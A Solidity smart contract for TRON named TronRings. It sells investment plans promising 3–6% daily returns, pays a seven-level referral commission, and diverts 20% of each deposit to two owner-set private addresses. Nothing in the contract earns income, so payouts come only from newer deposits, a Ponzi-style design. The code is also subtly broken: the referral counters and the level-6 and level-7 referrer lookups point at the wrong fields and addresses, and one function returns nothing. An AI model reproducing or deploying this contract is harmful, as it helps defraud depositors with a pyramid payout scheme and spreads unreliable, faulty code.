//SourceUnit: contract.sol

pragma solidity ^0.4.25;

contract TronRings {
    struct Plan {
        uint256 minimum;
        uint256 maximum;
        uint totallprofit;
    }

    struct Player {
        uint withdrawablemonthly;
        uint withdrawabledaily;
        uint withdrawn;
        uint totallinvested;
        uint[] builds;
        uint256[] investedvalue;
        uint256[] dailytime;
        uint256[] monthlytime;
        
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        
        address affFrom;
        uint256 affRewards;
        
    }

    address public owner;
    address private dest1;
    address private dest2;

    using SafeMath for uint256;

    uint256 public minimumwithdraw = 30*1000000;
    Plan[] public builds;
    mapping(address => Player) public players;
    
    event msgs(string title,uint256 value,uint256 value2);
    constructor() public {
        owner = msg.sender;

        builds.push(Plan({minimum:99 ,maximum:499000000 ,totallprofit: 3}));
        builds.push(Plan({minimum:499 ,maximum:999000000 ,totallprofit: 4}));
        builds.push(Plan({minimum:999 ,maximum:2999000000 ,totallprofit: 5}));
        builds.push(Plan({minimum:2999 ,maximum:10000000000000 ,totallprofit: 6}));
    }
    
    function setdestinations(address d1,address d2) external
    {
        require(msg.sender==owner);
        dest1 = d1;
        dest2 = d2;
    }
    
    function _Totalmontlyreward(address plr)internal view returns(uint)
    {
        players[plr].builds.length;
    }
    
    function register(address _addr, address _affAddr) private returns(Player){


      Player storage player = players[_addr];
        
      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      
      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);
      players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);
      players[_affAddr6].aff5sum = players[_affAddr5].aff6sum.add(1);
      players[_affAddr7].aff5sum = players[_affAddr5].aff7sum.add(1);

      
    }

    
    function buyplan(uint planid,address refer) payable public returns(uint[]) {
        require(planid<builds.length, "plan not found");
        require(msg.value>builds[planid].minimum,"minimum exceeded");
        require(msg.value<builds[planid].maximum,"maximum exceeded");
        
        Player storage player = players[msg.sender];
        
        
        if(player.totallinvested==0)
        {

            if(refer != address(0) && refer!=msg.sender){
              register(msg.sender, refer);
            }
            else{
              register(msg.sender, owner);
            }
        }
        
        
        // destinations share
        dest1.transfer(msg.value/10);
        dest2.transfer(msg.value/10);
        
        distributeRef(msg.value,player.affFrom);
        
        player.builds.push(planid);
        player.investedvalue.push(msg.value);
        player.dailytime.push(block.timestamp);
        player.monthlytime.push(block.timestamp);
        player.totallinvested += msg.value;

        return player.builds;
    }


    function() payable external {
        revert();
    }

    function investedplans(address addr) public view returns(uint[])
    {
        Player storage player = players[addr];
         uint[] memory data  = new uint[]((player.builds.length*4)+1);
         uint cindex;
        data[0]=now;
        cindex++;
        for(uint i = 0; i < player.builds.length; i++) {
            
            data[cindex] = (player.builds[i]);
            cindex++;
            data[cindex] = (player.investedvalue[i]);
            cindex++;
            data[cindex] = (player.dailytime[i]);
            cindex++;
            data[cindex] = (player.monthlytime[i]);
            cindex++;
        }
        return data;
    }

    function withdraw() external {

        Player storage player = players[msg.sender];
        _payout(msg.sender);
        
        require(player.withdrawabledaily+player.withdrawablemonthly > minimumwithdraw, "Insufficient funds");
        
        uint value = player.withdrawabledaily+player.withdrawablemonthly;
        
        player.withdrawabledaily = 0;
        player.withdrawablemonthly = 0;
        player.withdrawn += value;
        
        msg.sender.transfer(value);
        
    }


    function payoutOf(address addr) view public returns(uint[] memory value) {
        Player storage player = players[addr];
        uint[] memory data = new uint[](2);
        uint dailyprofit = 0;
        uint monthlyprofit = 0;
        
        // plans profit
        for(uint i = 0; i < player.builds.length; i++) {
            
            uint rewarddays = (block.timestamp - player.dailytime[i]).div(86400); // 
            uint rewardmonthds = (block.timestamp - player.monthlytime[i]).div(2592000); //

            uint buildvalue = player.builds[i];
            
            if(rewarddays>0){

                dailyprofit += player.investedvalue[i].div(100).mul(builds[buildvalue].totallprofit).mul(rewarddays);

                // additional reward 
                if(player.aff1sum>0){
                    uint ref1rewardpercent = player.aff1sum>=6 ? 30 : player.aff1sum.mul(5);       
                    dailyprofit += player.investedvalue[i].div(100).mul(ref1rewardpercent.mul(rewarddays)).div(10);
                }
            }
            if(rewardmonthds>0){
                monthlyprofit += player.investedvalue[i].div(100).mul(rewardmonthds);
            }

        }
        
        
        
        data[0] = dailyprofit.add(player.withdrawabledaily);
        data[1] = monthlyprofit.add(player.withdrawablemonthly);
        
        return data;
    }
    
    function _payout(address addr) internal {
        Player storage player = players[addr];

        uint dailyprofit = 0;
        uint monthlyprofit = 0;
        
        // plans profit
        for(uint i = 0; i < player.builds.length; i++) {
            
            uint rewarddays = (block.timestamp - player.dailytime[i]).div(86400); // 
            uint rewardmonthds = (block.timestamp - player.monthlytime[i]).div(2592000); //

            uint buildvalue = player.builds[i];
            
            if(rewarddays>0){

                dailyprofit += player.investedvalue[i].div(100).mul(builds[buildvalue].totallprofit).mul(rewarddays);
                player.dailytime[i] += rewarddays.mul(86400);

                // additional reward 
                if(player.aff1sum>0){
                    uint ref1rewardpercent = player.aff1sum>=6 ? 30 : player.aff1sum.mul(5);       
                    dailyprofit += player.investedvalue[i].div(100).mul(ref1rewardpercent.mul(rewarddays)).div(10);
                }
            }
            if(rewardmonthds>0){
                monthlyprofit += player.investedvalue[i].div(100).mul(rewardmonthds);
                player.monthlytime[i] += rewardmonthds.mul(2592000);
            }

        }
        
        player.withdrawabledaily += dailyprofit;
        player.withdrawablemonthly += monthlyprofit;

    }
    
    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(1575)).div(10000);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr4].affFrom;
        address _affAddr7 = players[_affAddr4].affFrom;
        
        
        
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(500)).div(10000);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(400)).div(10000);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            _affAddr2.transfer(_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(300)).div(10000);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(200)).div(10000);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            _affAddr4.transfer(_affRewards);
        }
        
        if (_affAddr5 != address(0)) {
            _affRewards = (_trx.mul(100)).div(10000);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            _affAddr5.transfer(_affRewards);
        }

        if (_affAddr6 != address(0)) {
            _affRewards = (_trx.mul(50)).div(10000);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
            _affAddr6.transfer(_affRewards);
        }

        if (_affAddr7 != address(0)) {
            _affRewards = (_trx.mul(25)).div(10000);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
            _affAddr7.transfer(_affRewards);
        }

    }

    function Reffrom(address addr) public view returns(address)
    {
        return players[addr].affFrom;
    }
	
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }
}